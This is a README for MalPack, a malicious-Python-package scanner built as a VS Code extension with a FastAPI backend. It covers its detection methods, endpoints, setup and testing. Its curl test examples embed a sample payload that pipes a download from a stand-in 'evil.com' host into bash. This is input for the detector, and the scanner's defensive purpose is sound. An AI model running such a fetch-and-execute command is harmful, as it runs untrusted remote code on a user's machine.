# MalPack - Malicious Package Scanner

MalPack is a VS Code extension + FastAPI backend that detects malicious Python packages **before** you install them. It offers four detection approaches selectable directly from the extension UI.

## Detection Methods

| Method | Description | Code-Level Details |
|--------|-------------|-------------------|
| ⚡ **Semgrep Analysis** | Pattern-based static analysis using Semgrep YAML rules | ✅ Yes |
| 📋 **Rule Based Analysis** | AST-based detection with 48+ hand-crafted rules across 8 security domains | ✅ Yes |
| 🤖 **LLM Based Analysis** | Sends each `.py` file to Google Gemini AI; merges results for package verdict | ❌ Summary only |
| 🧠 **Classifier Based** | ML classifier *(not yet implemented — coming soon)* | — |

## Project Structure

```
MalPackExtension/
├── backend/
│   ├── app/
│   │   ├── api/v1/endpoints/
│   │   │   ├── scan.py                 # Rule-based + Semgrep (shared)
│   │   │   ├── llm_check.py            # LLM/Gemini endpoint
│   │   │   └── classifier_check.py     # Classifier stub
│   │   ├── engine/                     # AST + regex + semgrep engines
│   │   └── main.py                     # FastAPI app + route registration
│   ├── test_all_endpoints.py           # Comprehensive tests (all 4 methods)
│   ├── test_enhanced_api.py            # Legacy endpoint tests
│   └── requirements.txt
└── extension/
    └── src/
        ├── extension.ts                # Main extension logic + method routing
        └── webviewProvider.ts          # All webview UI screens
```

## API Endpoints

| Route | Method | Description |
|-------|--------|-------------|
| `POST /api/v1/rule_based_check/check` | Rule-Based | AST + regex scan of a single file |
| `POST /api/v1/semgrep_check/check` | Semgrep | Semgrep scan of a single file |
| `POST /api/v1/llm_based_check` | LLM | Batch AI analysis of all Python files |
| `POST /api/v1/classifier_based_check` | Classifier | Stub (returns NOT_IMPLEMENTED) |
| `POST /api/v1/scan/summary` | Aggregation | Aggregates multi-file findings into a verdict |

## Setup & Installation

### Backend Setup

```bash
cd backend
python3 -m venv venv
source venv/bin/activate
pip install -r requirements.txt
pip install semgrep
uvicorn app.main:app --reload --host 0.0.0.0 --port 8000
```

### Extension Setup

```bash
cd extension
npm install
```

---

## 🧪 Step-by-Step Testing Guide

### A. Backend API Testing (curl / Python)

**1. Start the backend:**
```bash
cd backend && source venv/bin/activate
uvicorn app.main:app --reload --host 0.0.0.0 --port 8000
```

**2. Quick health check:**
```bash
curl http://localhost:8000/
# Expected: {"status":"MalPack Backend Running"}
```

**3. Test rule-based endpoint (malicious sample):**
```bash
curl -s -X POST http://localhost:8000/api/v1/rule_based_check/check \
  -H "Content-Type: application/json" \
  -d '{"file_path":"test.py","content":"import os; os.system(\"curl http://evil.com/sh | bash\")"}'
```

**4. Test semgrep endpoint:**
```bash
curl -s -X POST http://localhost:8000/api/v1/semgrep_check/check \
  -H "Content-Type: application/json" \
  -d '{"file_path":"test.py","content":"import os\nos.system(\"id\")"}'
```

**5. Test LLM endpoint (Gemini AI):**
```bash
curl -s -X POST http://localhost:8000/api/v1/llm_based_check \
  -H "Content-Type: application/json" \
  -d '{
    "package_name": "test-pkg",
    "files": [{"file_path": "main.py", "content": "import os\nos.system(\"curl http://evil.com | bash\")"}]
  }'
```

**6. Test classifier stub:**
```bash
curl -s -X POST http://localhost:8000/api/v1/classifier_based_check \
  -H "Content-Type: application/json" \
  -d '{"package_name": "test-pkg", "files": []}'
```

**7. Run full test suite:**
```bash
python3 test_all_endpoints.py
```

---

### B. VS Code Extension Testing (Local)

**Prerequisites:** Backend running on port 8000, Node.js installed.

**Step 1 — Build the extension:**
```bash
cd extension
npm install
npm run compile
# Look for: "Compilation complete" with 0 errors
```

**Step 2 — Open in VS Code:**
```bash
code .    # from the extension/ directory
```

**Step 3 — Launch Extension Development Host:**
- Press **F5** (or Run → Start Debugging)
- A new VS Code window opens (title bar says *Extension Development Host*)

**Step 4 — Run the command:**
- Press **Ctrl+Shift+P** in the *Extension Development Host* window
- Type: `MalPack: Secure Install` → press Enter

**Step 5 — Test each detection method:**

| Test | Expected Result |
|------|----------------|
| Select **LLM Based Analysis** → package: `requests` | BENIGN verdict with Gemini AI summary |
| Select **LLM Based Analysis** → package: `colourama` (typosquat) | Likely MALICIOUS summary |
| Select **Rule Based Analysis** → package: `requests` | BENIGN verdict |
| Select **Semgrep Analysis** → package: `requests` | BENIGN verdict |
| Select **Classifier Based Analysis** | "Coming Soon" screen shown; no package input requested |

**Step 6 — Verify UI flow for malicious package (rule-based):**
1. Method selector screen appears with 4 cards → Classifier is grayed out
2. Select **Rule Based Analysis**
3. Enter package name
4. Progress notification appears during scan
5. Verdict panel → shows method badge, stats, "Show Details" button
6. Click **Show Details** → high-level issue list with severity badges
7. Click **Show in Code** → file opens with red underlines; hover for tooltip
8. Click **Block Installation** → temp files cleaned up

**Step 7 — Verify LLM flow:**
1. Select **LLM Based Analysis**
2. Enter package name
3. Progress shows "Sending N number of files to Gemini AI…"
4. Result panel shows: method badge "🤖 Gemini AI Analysis", verdict, file count, AI-generated summary text
5. **No "Show in Code" button** (LLM provides summary only)

---

## Verification

```bash
# Rule + Semgrep rules
python3 backend/tests/verify_rules.py
python3 backend/tests/verify_semgrep.py

# All 4 endpoints
python3 backend/test_all_endpoints.py
```

### C. Evaluating Detection Accuracy (F1 Score)

MalPack includes a test suite covering 40+ AST and Semgrep rules to calculate the system's Precision, Recall, and F1 Score. Each rule has a strict "malicious" and "benign" test case to ensure no false positives.

**Step 1 — Generate the Test Cases:**
```bash
cd backend
source venv/bin/activate
python3 tests/test_cases_data.py
```
*(This generates test files inside `backend/tests/test_cases/` for all 40+ rules)*

**Step 2 — Run the F1 Evaluation Suite:**
```bash
python3 tests/run_eval.py
```

**Expected Output:** The script will evaluate all generated files through the AST, Regex, and Semgrep engines locally to compute True Positives (TP), False Positives (FP), True Negatives (TN), and False Negatives (FN), finally outputting the **F1 Score**.

---

## Detection Fallbacks & Error Handling

MalPack is designed with robust fallbacks to ensure you are never left without analysis:

1. **AST to Regex Fallback**: If the primary AST (Abstract Syntax Tree) parser fails to detect an obfuscated payload or cannot parse the Python file due to syntax errors, the system automatically falls back to the **Regex Engine**, scanning raw text for hardcoded IPs (`NET-003`), long hex payloads (`EVASION-006`), and base64 blobs.
2. **LLM API Quota Fallback**: If the Gemini API limit is exhausted (e.g., `429 RESOURCE_EXHAUSTED`), the analysis does not silently fail as "Safe". Instead, it intercepts the error and returns a distinct **API_ERROR** verdict in the VS Code UI, giving explicit instructions on how to wait for the quota reset or change the API key.
3. **PyPI 404 Fallback**: If a package name is misspelled or does not exist on PyPI, the system cleanly catches the 404 error before the extraction phase and stops the scan with a friendly "Package not found on PyPI" message.
4. **Semgrep Missing Rules**: If Semgrep YAML rules are unavailable or the binary fails, MalPack relies entirely on the built-in pure Python AST engine, guaranteeing that Rule-Based scanning always functions.
